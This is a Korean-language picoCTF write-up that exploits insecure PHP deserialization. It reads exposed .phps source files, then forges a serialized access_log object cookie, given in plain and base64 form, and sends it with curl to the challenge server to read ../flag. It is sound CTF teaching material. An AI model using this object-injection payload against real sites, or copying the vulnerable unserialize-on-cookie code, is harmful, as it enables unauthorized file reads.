---
tags:
  - picoCTF
tech:
  - PHP Object Injection
---
#web #php #php-object-injection

# Walk-Through

문제 링크로 접속하면 username과 password 입력 박스가 보인다. 입력 박스를 통해 기본적으로 시도해볼 수 있는 SQL Injection 을 해봤지만 성공하진 않는다.

문제 풀이에 대한 힌트를 얻기 위해 사이트 내부로 돌아다니자. 일단 /robots.txt 를 접속 시도했을때 다음과 같은 내용이 보인다.
```txt
User-agent: *
Disallow: /admin.phps
```

https://www.solvusoft.com/ko/file-extensions/file-extension-PHPS 에 따르면 phps는 PHP Source를 볼 수 있는  파일이라고 되어있다. robots.txt를 통해 admin.phps가 노출된 걸 통해 사이트 내 다른 파일도 phps가 접근 가능한게 아닐까 ?

F12를 눌러 Network 탭을 통해 username & password 입력박스의 경로가 "/index.php" 라는 걸 확인할 수 있다. 이후 index.phps 로 접근하면 소스 파일을 열어볼 수 있다.
```php
<?php
require_once("cookie.php");

if(isset($_POST["user"]) && isset($_POST["pass"])){
	$con = new SQLite3("../users.db");
	$username = $_POST["user"];
	$password = $_POST["pass"];
	$perm_res = new permissions($username, $password);
	if ($perm_res->is_guest() || $perm_res->is_admin()) {
		setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
		header("Location: authentication.php");
		die();
	} else {
		$msg = '<h6 class="text-center" style="color:red">Invalid Login.</h6>';
	}
}
?>
```
해당 소스를 흝어보니 로그인에 성공한 경우 authentication.php를 호출하는걸로 보아 이 파일도 phps로 접근하면 소스를 읽어볼 수 있을 듯 하다.
```php
<?php

class access_log
{
	public $log_file;

	function __construct($lf) {
		$this->log_file = $lf;
	}

	function __toString() {
		return $this->read_log();
	}

	function append_to_log($data) {
		file_put_contents($this->log_file, $data, FILE_APPEND);
	}

	function read_log() {
		return file_get_contents($this->log_file);
	}
}

require_once("cookie.php");
if(isset($perm) && $perm->is_admin()){
	$msg = "Welcome admin";
	$log = new access_log("access.log");
	$log->append_to_log("Logged in at ".date("Y-m-d")."\n");
} else {
	$msg = "Welcome guest";
}
?>
```
authentication.phps 에서 또한 cookie.php 파일을 확인할 수 있다. cookie.phps로 접속해서 소스를 확인하자.
```php
<?php
session_start();

class permissions
{
	public $username;
	public $password;

	function __construct($u, $p) {
		$this->username = $u;
		$this->password = $p;
	}

	function __toString() {
		return $u.$p;
	}

	function is_guest() {
		$guest = false;

		$con = new SQLite3("../users.db");
		$username = $this->username;
		$password = $this->password;
		$stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
		$stm->bindValue(1, $username, SQLITE3_TEXT);
		$stm->bindValue(2, $password, SQLITE3_TEXT);
		$res = $stm->execute();
		$rest = $res->fetchArray();
		if($rest["username"]) {
			if ($rest["admin"] != 1) {
				$guest = true;
			}
		}
		return $guest;
	}

        function is_admin() {
                $admin = false;

                $con = new SQLite3("../users.db");
                $username = $this->username;
                $password = $this->password;
                $stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
                $stm->bindValue(1, $username, SQLITE3_TEXT);
                $stm->bindValue(2, $password, SQLITE3_TEXT);
                $res = $stm->execute();
                $rest = $res->fetchArray();
                if($rest["username"]) {
                        if ($rest["admin"] == 1) {
                                $admin = true;
                        }
                }
                return $admin;
        }
}

if(isset($_COOKIE["login"])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		$g = $perm->is_guest();
		$a = $perm->is_admin();
	}
	catch(Error $e){
		die("Deserialization error. ".$perm);
	}
}

?>
```

cookie.phps를 통해 cookie에 login이라는 key를 통해 무언가 시도해볼 수 있는 것으로 보인다.

# PHP Object Injection
PHP Object injection은 unserialize() 함수에 사용자가 입력한 값을 전달되기 전에 제대로 삭제되지 않은 경우 발생한다고 한다.

PHP는 객체 직렬화를 허용하므로 공격자가 임시로 직렬화된 문자열을 취약한 unserializer() 호출에 전달하여 임의의 PHP 객체를 주입할 수 있다.

이 문제에서는 authentication.php에 정의된 "access_log"의 log_file 변수에 문제에서 힌트로 준 플래그 파일의 경로를 가리키게 해보자.  

# Payload

cookie의 login이라는 key에 입력할 value를 다음과 같이 입력하자.
```
O:10:"access_log":1:{s:8:"log_file";s:7:"../flag";}
```
위 값이 의미하는 바는 각각 다음과 같다.
```
Object:Object Name Length:"Class Name":Object Size:{s}
```
O : Object
10 : Object Name Length
"access_log" : Class Name
1 : Object Size (입력값)
s : String
8 : String Length
log_file : String Name
s : String
7 : String Legnth
"../flag" : String Name


위 값을 base64로 encode 하며 다음과 같은 값이 나온다.
```
TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
```
브라우저의 쿠키 편집 도구를 이용해서 시도할 수도 있겠으나 단순히 curl을 이용해보자.
``` shell
╰─$ curl -v --cookie "login=TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9" http://mercury.picoctf.net:8404/authentication.php
```
위 curl 명령의 결과로 flag 획득이 가능하다.